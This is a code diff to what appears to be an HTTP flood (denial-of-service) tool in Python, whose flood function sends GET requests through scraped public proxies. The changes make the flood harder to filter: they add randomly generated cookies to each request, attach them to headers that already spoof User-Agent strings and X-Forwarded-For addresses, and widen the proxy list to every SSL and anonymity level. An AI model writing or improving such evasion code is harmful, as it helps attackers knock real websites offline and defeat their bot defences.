@@ -17,7 +17,7 @@ from halo import Halo
 
 
 os.system('clear')
-__version__ = '4.0.4'
+__version__ = '4.0.5 BETA'
 __method__ = 'HTTP'
 #  
 # --------------------------------------
@@ -52,6 +52,16 @@ def emailCreateFake():
     return email
 
 
+def generate_random_cookies() -> Dict[str, str]:
+    """Generate random cookies."""
+    cookie_count = random.randint(1, 5)  # عدد الكوكيز العشوائية
+    cookies = {}
+    for _ in range(cookie_count):
+        key = ''.join(random.choices(string.ascii_letters, k=random.randint(3, 8)))
+        value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
+        cookies[key] = value
+    return cookies
+
 def buildBlock(size):
 
     block = ''.join(random.choice(string.ascii_letters) for _ in range(size))
@@ -73,7 +83,7 @@ def get_http_proxies() -> List[Dict[str, str]]:
     try:
         # Fetch HTTP proxies
         with requests.get(
-            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=1000&country=all",
+            "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
             verify=False,
         ) as proxy_list_http:
             proxies_http = [
@@ -111,7 +121,7 @@ ua = UserAgent()
 
 def generate_headers():
     """Generate more advanced headers to mimic real requests."""
-    return {
+    headers = {
         "User-Agent": ua.random,  # Use random User-Agent
         "X-Requested-With": random.choice(["XMLHttpRequest", "FetchRequest"]),
         "Connection": "keep-alive",
@@ -129,6 +139,11 @@ def generate_headers():
         "Sec-Fetch-Dest": "document",
         "X-Forwarded-For": fake.ipv4()
     }
+    random_cookies = generate_random_cookies()
+    headers["Cookie"] = "; ".join([f"{k}={v}" for k, v in random_cookies.items()])
+
+    return headers
+
 
 def flood(target: str) -> None:
     """Start an HTTP GET request flood through proxies."""
